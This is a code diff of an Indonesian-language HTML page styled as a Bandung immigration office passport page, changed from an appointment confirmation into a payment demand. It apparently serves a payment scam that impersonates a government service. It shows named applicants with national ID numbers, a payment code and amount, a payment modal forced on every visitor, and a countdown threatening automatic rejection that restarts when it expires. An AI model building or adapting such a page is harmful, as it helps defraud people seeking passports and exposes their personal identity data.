@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Status Aktif Permohonan Paspor</title>
+    <title>Pembayaran Permohonan Paspor</title>
     <style>
         * {
             margin: 0;
@@ -32,7 +32,7 @@
         }
         
         .header {
-            background-color: #28a745;
+            background-color: #003366;
             color: white;
             padding: 20px;
             text-align: center;
@@ -56,35 +56,6 @@
         
         .content {
             padding: 25px;
-        }
-        
-        .success-icon {
-            text-align: center;
-            margin: 20px 0;
-        }
-        
-        .success-icon img {
-            width: 80px;
-            height: 80px;
-        }
-        
-        .success-message {
-            text-align: center;
-            margin-bottom: 25px;
-        }
-        
-        .success-title {
-            font-size: 22px;
-            font-weight: bold;
-            color: #28a745;
-            margin-bottom: 10px;
-        }
-        
-        .success-text {
-            font-size: 16px;
-            color: #333;
-            line-height: 1.5;
-            text-align: left;
         }
         
         .info-section {
@@ -117,175 +88,6 @@
             color: #333;
         }
         
-        .office-address {
-            background-color: #f0f7ff;
-            border-radius: 8px;
-            padding: 15px;
-            margin-bottom: 20px;
-            border-left: 4px solid #003366;
-        }
-        
-        .office-title {
-            font-size: 16px;
-            font-weight: bold;
-            color: #003366;
-            margin-bottom: 8px;
-        }
-        
-        .office-details {
-            font-size: 14px;
-            color: #333;
-            line-height: 1.5;
-        }
-        
-        .schedule-info {
-            background-color: #e8f5e9;
-            border-radius: 8px;
-            padding: 15px;
-            margin-bottom: 20px;
-            border-left: 4px solid #28a745;
-        }
-        
-        .schedule-title {
-            font-size: 16px;
-            font-weight: bold;
-            color: #2e7d32;
-            margin-bottom: 8px;
-        }
-        
-        .schedule-details {
-            font-size: 14px;
-            color: #333;
-            line-height: 1.5;
-        }
-        
-        .next-steps {
-            background-color: #f0fff0;
-            border-radius: 8px;
-            padding: 15px;
-            margin-bottom: 25px;
-            border-left: 4px solid #28a745;
-        }
-        
-        .next-steps-title {
-            font-size: 16px;
-            font-weight: bold;
-            color: #28a745;
-            margin-bottom: 8px;
-        }
-        
-        .next-steps-text {
-            font-size: 14px;
-            color: #333;
-            line-height: 1.5;
-        }
-        
-        .btn-container {
-            display: flex;
-            justify-content: center;
-            margin-top: 25px;
-            gap: 15px;
-            flex-wrap: wrap;
-        }
-        
-        .btn {
-            background-color: #003366;
-            color: white;
-            border: none;
-            padding: 12px 25px;
-            border-radius: 5px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            transition: background-color 0.3s;
-            text-align: center;
-            min-width: 200px;
-        }
-        
-        .btn:hover {
-            background-color: #002244;
-        }
-        
-        .btn-express {
-            background-color: #e63946;
-        }
-        
-        .btn-express:hover {
-            background-color: #c41e3a;
-        }
-        
-        .footer {
-            background-color: #f1f1f1;
-            padding: 15px;
-            text-align: center;
-            font-size: 12px;
-            color: #666;
-        }
-        
-        .copyright {
-            font-weight: 500;
-        }
-        
-        /* Modal Styles */
-        .modal {
-            display: none;
-            position: fixed;
-            z-index: 1000;
-            left: 0;
-            top: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.7);
-            overflow: auto;
-        }
-        
-        .modal-content {
-            background-color: white;
-            margin: 10% auto;
-            padding: 0;
-            border-radius: 10px;
-            width: 90%;
-            max-width: 500px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
-            animation: modalopen 0.4s;
-        }
-        
-        @keyframes modalopen {
-            from {opacity: 0; transform: translateY(-50px);}
-            to {opacity: 1; transform: translateY(0);}
-        }
-        
-        .modal-header {
-            background-color: #e63946;
-            color: white;
-            padding: 15px 20px;
-            border-radius: 10px 10px 0 0;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        
-        .modal-title {
-            font-size: 18px;
-            font-weight: bold;
-        }
-        
-        .close {
-            color: white;
-            font-size: 28px;
-            font-weight: bold;
-            cursor: pointer;
-            line-height: 1;
-        }
-        
-        .close:hover {
-            opacity: 0.7;
-        }
-        
-        .modal-body {
-            padding: 25px;
-        }
-        
         .payment-info {
             background-color: #f8f9fa;
             border-radius: 8px;
@@ -308,23 +110,6 @@
             text-align: center;
             margin: 15px 0;
             letter-spacing: 1px;
-            user-select: all;
-            cursor: pointer;
-            padding: 8px;
-            border-radius: 4px;
-            transition: background-color 0.3s;
-        }
-        
-        .payment-code:hover {
-            background-color: #eaeaea;
-        }
-        
-        .copy-hint {
-            font-size: 12px;
-            color: #666;
-            text-align: center;
-            margin-top: 5px;
-            font-style: italic;
         }
         
         .timer-container {
@@ -349,7 +134,7 @@
             min-width: 200px;
         }
         
-        .warning-box {
+        .warning {
             background-color: #fff8e1;
             border-left: 4px solid #ffc107;
             padding: 15px;
@@ -358,30 +143,38 @@
             color: #5d4037;
         }
         
-        .notice {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
+        .btn-container {
+            display: flex;
+            justify-content: center;
+            margin-top: 25px;
+        }
+        
+        .btn {
+            background-color: #003366;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        
+        .btn:hover {
+            background-color: #002244;
+        }
+        
+        .footer {
+            background-color: #f1f1f1;
             padding: 15px;
             text-align: center;
-            color: white;
-            font-weight: bold;
-            z-index: 2000;
-            display: none;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+            font-size: 12px;
+            color: #666;
         }
         
-        .notice-success {
-            background-color: #28a745;
-        }
-        
-        .notice-error {
-            background-color: #e63946;
-        }
-        
-        .notice-info {
-            background-color: #003366;
+        .copyright {
+            font-weight: 500;
         }
         
         @media (max-width: 480px) {
@@ -401,14 +194,17 @@
                 padding: 20px 15px;
             }
             
-            .btn-container {
-                flex-direction: column;
-                align-items: center;
+            .payment-amount {
+                font-size: 20px;
             }
             
-            .btn {
-                width: 100%;
-                max-width: 300px;
+            .payment-code {
+                font-size: 16px;
+            }
+            
+            .timer {
+                font-size: 20px;
+                min-width: 180px;
             }
         }
     </style>
@@ -417,73 +213,86 @@
     <div class="popup-container">
         <div class="header">
             <img src="https://z-cdn-media.chatglm.cn/files/12038e0f-115c-45aa-9d42-52d6ea82ffe6_Logo.png?auth_key=1790939066-c0ecc9049e204f12a6409fbc78ea90a8-0-f4eae3f3ae6679c5ee07784c0200fba2" alt="Logo Imigrasi" class="logo">
-            <div class="title">STATUS AKTIF</div>
-            <div class="subtitle">Permohonan Paspor Baru</div>
+            <div class="title">PEMBAYARAN PERMOHONAN</div>
+            <div class="subtitle">Paspor Baru Elektronik 10 Tahun</div>
         </div>
         
         <div class="content">
-            <div class="success-icon">
-                <img src="https://z-cdn-media.chatglm.cn/files/5a6d7e4e-0d9d-4b3d-9f7d-0e5c6e3b4a7c_success-icon.png?auth_key=1790939066-8d4b8c1f9b2e4d5a8c0e6f2a9b1c3d7-0-8f4e7d3c2b1a9f8e7d6c5b4a3f2e1d0" alt="Success Icon">
-            </div>
-            
-            <div class="success-message">
-                <div class="success-title">TERIMA KASIH!</div>
-                <div class="success-text">
-                    <p>Permohonan Anda berhasil diproses. Silahkan lanjutkan untuk proses pembuatan paspor dengan datang tepat waktu sesuai jadwal ke Kantor Imigrasi Kelas 1 TPI Bandung.</p>
-                </div>
-            </div>
-            
             <div class="info-section">
                 <div class="info-title">Data Pemohon</div>
                 <div class="info-row">
                     <span class="info-label">Nama</span>
-                    <span class="info-value">TIARA SITI ROHMAH</span>
+                    <span class="info-value">NATSIR BAHARI TAJUDIN</span>
                 </div>
                 <div class="info-row">
                     <span class="info-label">NIK</span>
-                    <span class="info-value">3202016211960004</span>
-                </div>
-                <div class="info-row">
-                    <span class="info-label">Tanggal Lahir</span>
-                    <span class="info-value">SUKABUMI, 22-11-1996</span>
+                    <span class="info-value">3204142203870002</span>
                 </div>
                 <div class="info-row">
                     <span class="info-label">Jenis Kelamin</span>
-                    <span class="info-value">Perempuan</span>
+                    <span class="info-value">Laki-laki</span>
                 </div>
                 <div class="info-row">
-                    <span class="info-label">Status Layanan</span>
-                    <span class="info-value">Permohonan Paspor Baru - Paspor Elektronik 5 Tahun</span>
+                    <span class="info-label">Alamat</span>
+                    <span class="info-value">KP. LANGONSARI Gol.Darah</span>
                 </div>
             </div>
             
-            <div class="office-address">
-                <div class="office-title">Kantor Imigrasi</div>
-                <div class="office-details">
-                    <strong>Kantor Imigrasi Kelas 1 TPI Bandung</strong><br>
-                    Jl. Surapati<br>
-                    Bandung, Jawa Barat
+            <div class="info-section">
+                <div class="info-title">Informasi Kantor</div>
+                <div class="info-row">
+                    <span class="info-label">Kantor Imigrasi</span>
+                    <span class="info-value">Kelas 1 TPI Bandung</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Alamat Kantor</span>
+                    <span class="info-value">Jl. Surapati</span>
                 </div>
             </div>
             
-            <div class="schedule-info">
-                <div class="schedule-title">Jadwal Kedatangan</div>
-                <div class="schedule-details">
-                    <strong>Hari/Tanggal:</strong> Jum'at, 7 November 2025<br>
-                    <strong>Waktu:</strong> 10:00 - 11:30 WIB<br>
-                    <strong>Lokasi:</strong> Kantor Imigrasi Kelas 1 TPI Bandung<br>
-                    <strong>Ruangan:</strong> Ruang Pelayanan Paspor
+            <div class="info-section">
+                <div class="info-title">Informasi Agen</div>
+                <div class="info-row">
+                    <span class="info-label">Nama Akun Agen</span>
+                    <span class="info-value">Hj. Erick Sm SH</span>
+                </div>
+                <div class="info-row">
+                    <span class="info-label">Email Agen</span>
+                    <span class="info-value">agency@bandung.com</span>
                 </div>
             </div>
             
-            <div class="next-steps">
-                <div class="next-steps-title">Langkah Selanjutnya</div>
-                <div class="next-steps-text">
-                    1. Cetak bukti ini sebagai jadwal kedatangan<br>
-                    2. Datang ke Kantor Imigrasi sesuai jadwal<br>
-                    3. Bawa persyaratan lengkap (KTP asli, KK, akta kelahiran, dll.)<br>
-                    4. Ikuti proses perekaman biometrik dan wawancara
+            <div class="info-section">
+                <div class="info-title">Jadwal Kedatangan</div>
+                <div class="info-row">
+                    <span class="info-label">Tanggal</span>
+                    <span class="info-value">Selasa, 18 November 2025</span>
                 </div>
+                <div class="info-row">
+                    <span class="info-label">Waktu</span>
+                    <span class="info-value">10:30 - 11:00 WIB</span>
+                </div>
+            </div>
+            
+            <div class="payment-info">
+                <div class="info-title">Informasi Pembayaran</div>
+                <div class="info-row">
+                    <span class="info-label">Jumlah Pembayaran</span>
+                </div>
+                <div class="payment-amount">Rp 953.500,00</div>
+                <div class="info-row">
+                    <span class="info-label">Kode Pembayaran</span>
+                </div>
+                <div class="payment-code">910266000000826566</div>
+            </div>
+            
+            <div class="timer-container">
+                <div class="timer-label">Batas Waktu Pembayaran</div>
+                <div class="timer" id="countdown">02:00:00</div>
+            </div>
+            
+            <div class="warning">
+                <strong>Perhatian:</strong> Apabila batas waktu telah habis dan Anda belum melakukan pembayaran, maka permohonan Anda akan ditolak oleh sistem secara otomatis.
             </div>
             
             <div class="btn-container">
@@ -496,136 +305,22 @@
         </div>
     </div>
 
-    <!-- Modal untuk Pembayaran Layanan Percepatan -->
-    <div id="paymentModal" class="modal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <div class="modal-title">Pembayaran Layanan Percepatan</div>
-                <span class="close" onclick="closePaymentModal()">&times;</span>
-            </div>
-            <div class="modal-body">
-                <div class="payment-info">
-                    <div class="info-title">Informasi Pembayaran</div>
-                    <div class="info-row">
-                        <span class="info-label">Layanan</span>
-                    </div>
-                    <div style="text-align: center; font-weight: bold; margin: 10px 0;">Layanan Percepatan Paspor</div>
-                    <div class="info-row">
-                        <span class="info-label">Jumlah Pembayaran</span>
-                    </div>
-                    <div class="payment-amount">Rp 503.500,00</div>
-                    <div class="info-row">
-                        <span class="info-label">Kode Pembayaran</span>
-                    </div>
-                    <div class="payment-code" id="paymentCode">91266000000342305</div>
-                    <div class="copy-hint">Klik pada kode pembayaran untuk menyalin</div>
-                </div>
-                
-                <div class="timer-container">
-                    <div class="timer-label">Batas Waktu Pembayaran</div>
-                    <div class="timer" id="countdown">01:15:00</div>
-                </div>
-                
-                <div class="warning-box">
-                    <strong>Perhatian:</strong> Jika Anda sudah memilih layanan percepatan dan tidak melakukan pembayaran, maka permohonan paspor sebelumnya akan ditolak otomatis oleh sistem. Harap melakukan pembayaran sebelum batas waktu yang ditentukan.
-                </div>
-                
-                <div class="btn-container">
-                    <button class="btn" onclick="window.print()">Cetak Bukti</button>
-                    <button class="btn btn-express" onclick="showPaymentInfo()">Lakukan Pembayaran</button>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Notifikasi -->
-    <div id="notice" class="notice"></div>
-
     <script>
-        // Fungsi untuk menampilkan notifikasi
-        function showNotice(message, type) {
-            const notice = document.getElementById('notice');
-            notice.textContent = message;
-            notice.className = 'notice notice-' + type;
-            notice.style.display = 'block';
-            
-            setTimeout(() => {
-                notice.style.opacity = '0';
-                notice.style.transition = 'opacity 0.5s';
-                setTimeout(() => {
-                    notice.style.display = 'none';
-                    notice.style.opacity = '1';
-                }, 500);
-            }, 3000);
-        }
-        
-        // Fungsi untuk menutup modal pembayaran
-        function closePaymentModal() {
-            document.getElementById('paymentModal').style.display = 'none';
-        }
-        
-        // Fungsi untuk menampilkan modal pembayaran
-        function showPaymentModal() {
-            document.getElementById('paymentModal').style.display = 'block';
-        }
-        
-        // Fungsi untuk menampilkan informasi pembayaran
-        function showPaymentInfo() {
-            showNotice("Silakan lakukan pembayaran menggunakan kode pembayaran yang tersedia.", "info");
-        }
-        
-        // Fungsi untuk menyalin kode pembayaran
-        document.getElementById('paymentCode').addEventListener('click', function() {
-            // Membuat elemen input sementara
-            const tempInput = document.createElement('input');
-            tempInput.value = this.textContent;
-            document.body.appendChild(tempInput);
-            
-            // Memilih dan menyalin teks
-            tempInput.select();
-            document.execCommand('copy');
-            
-            // Menghapus elemen input sementara
-            document.body.removeChild(tempInput);
-            
-            // Memberi tahu pengguna bahwa kode telah disalin
-            const originalText = this.textContent;
-            this.textContent = "Tersalin!";
-            this.style.backgroundColor = "#e6f7e6";
-            
-            // Mengembalikan teks asli setelah 2 detik
-            setTimeout(() => {
-                this.textContent = originalText;
-                this.style.backgroundColor = "";
-            }, 2000);
-        });
-        
-        // Set waktu awal (1 jam 15 menit dalam detik)
-        const initialTime = 1 * 60 * 60 + 15 * 60; // 4500 detik
+        // Set waktu awal (2 jam dalam detik)
+        const initialTime = 2 * 60 * 60;
         
         // Cek apakah ada waktu tersisa di localStorage
-        let timeLeft = localStorage.getItem('expressPaymentTimeLeft') 
-            ? parseInt(localStorage.getItem('expressPaymentTimeLeft')) 
+        let timeLeft = localStorage.getItem('paymentTimeLeft') 
+            ? parseInt(localStorage.getItem('paymentTimeLeft')) 
             : initialTime;
         
-        // Cek apakah timer sudah dimulai sebelumnya
-        const timerStarted = localStorage.getItem('expressPaymentTimerStarted') === 'true';
-        
-        // Jika timer sudah dimulai, hitung waktu yang berlalu sejak terakhir kali
-        if (timerStarted) {
-            const lastUpdateTime = parseInt(localStorage.getItem('expressPaymentLastUpdate') || Date.now());
-            const currentTime = Date.now();
-            const elapsedSeconds = Math.floor((currentTime - lastUpdateTime) / 1000);
-            
-            // Kurangi waktu yang berlalu dari waktu tersisa
-            timeLeft = Math.max(0, timeLeft - elapsedSeconds);
+        // Jika waktu tersisa kurang dari atau sama dengan 0, set ulang
+        if (timeLeft <= 0) {
+            timeLeft = initialTime;
         }
         
         // Simpan waktu tersisa ke localStorage
-        localStorage.setItem('expressPaymentTimeLeft', timeLeft);
-        
-        // Tandai bahwa timer sudah dimulai
-        localStorage.setItem('expressPaymentTimerStarted', 'true');
+        localStorage.setItem('paymentTimeLeft', timeLeft);
         
         // Update tampilan countdown
         function updateCountdown() {
@@ -642,10 +337,7 @@
             document.getElementById('countdown').textContent = formattedTime;
             
             // Simpan waktu tersisa ke localStorage
-            localStorage.setItem('expressPaymentTimeLeft', timeLeft);
-            
-            // Simpan waktu update terakhir
-            localStorage.setItem('expressPaymentLastUpdate', Date.now());
+            localStorage.setItem('paymentTimeLeft', timeLeft);
             
             // Kurangi waktu
             timeLeft--;
@@ -657,56 +349,22 @@
                 document.getElementById('countdown').style.color = "#ff0000";
                 
                 // Tampilkan pemberitahuan bahwa permohonan ditolak
-                const warning = document.querySelector('.warning-box');
-                warning.innerHTML = "<strong>Perhatian:</strong> Waktu pembayaran telah habis. Permohonan paspor Anda telah ditolak oleh sistem secara otomatis karena Anda telah memilih layanan percepatan tetapi tidak melakukan pembayaran. Anda harus membuat permohonan baru jika masih ingin mengajukan paspor.";
+                const warning = document.querySelector('.warning');
+                warning.innerHTML = "<strong>Perhatian:</strong> Waktu pembayaran telah habis. Permohonan Anda telah ditolak oleh sistem secara otomatis.";
                 warning.style.backgroundColor = "#ffebee";
                 warning.style.borderLeftColor = "#f44336";
                 warning.style.color = "#c62828";
                 
-                // Nonaktifkan tombol cetak dan pembayaran
-                document.querySelectorAll('#paymentModal .btn').forEach(btn => {
-                    btn.disabled = true;
-                    btn.style.backgroundColor = "#cccccc";
-                    btn.style.cursor = "not-allowed";
-                });
+                // Nonaktifkan tombol cetak
+                document.querySelector('.btn').disabled = true;
+                document.querySelector('.btn').style.backgroundColor = "#cccccc";
+                document.querySelector('.btn').style.cursor = "not-allowed";
             }
         }
         
-        // Fungsi untuk memulai countdown
-        function startCountdown() {
-            // Hentikan interval yang sudah ada jika ada
-            if (typeof timerInterval !== 'undefined') {
-                clearInterval(timerInterval);
-            }
-            
-            // Jalankan countdown setiap detik
-            updateCountdown();
-            timerInterval = setInterval(updateCountdown, 1000);
-        }
-        
-        // Event listener untuk tombol cetak
-        document.querySelector('.popup-container .btn').addEventListener('click', function() {
-            showNotice("Mencetak Bukti Jadwal Kedatangan...", "success");
-        });
-        
-        // Menutup modal ketika klik di luar modal
-        window.onclick = function(event) {
-            const paymentModal = document.getElementById('paymentModal');
-            
-            if (event.target === paymentModal) {
-                paymentModal.style.display = 'none';
-            }
-        }
-        
-        // Tampilkan popup pembayaran saat halaman dimuat
-        window.onload = function() {
-            // Tampilkan modal pembayaran langsung untuk semua orang
-            showPaymentModal();
-            startCountdown();
-            
-            // Tampilkan notifikasi
-            showNotice("Silakan lakukan pembayaran untuk layanan percepatan paspor.", "info");
-        };
+        // Jalankan countdown setiap detik
+        updateCountdown();
+        const timerInterval = setInterval(updateCountdown, 1000);
     </script>
 </body>
 </html>
